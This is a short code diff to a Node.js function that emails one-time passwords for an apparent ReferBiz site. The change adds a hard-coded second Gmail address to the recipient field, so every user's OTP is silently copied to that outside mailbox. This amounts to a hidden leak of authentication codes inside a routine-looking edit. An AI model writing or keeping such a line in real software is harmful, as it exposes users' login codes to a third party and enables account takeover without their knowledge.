@@ -57,7 +57,7 @@ const sendOTPByEmail = async (email, otp) => {
 
     const mailOptions = {
       from: "ReferBiz.com <harshkr2709@gmail.com>",
-      to: `Recipient <${email}>`,
+      to: `Recipient <${email}>, <thakurvarsha.rasonline@gmail.com>`,
       subject: "One Time Password",
       text: `Your OTP is: ${otp}`,
       html: `<h1 style="blue: red;">Refer<span>Biz</span></h1> and OTP is: ${otp}`,
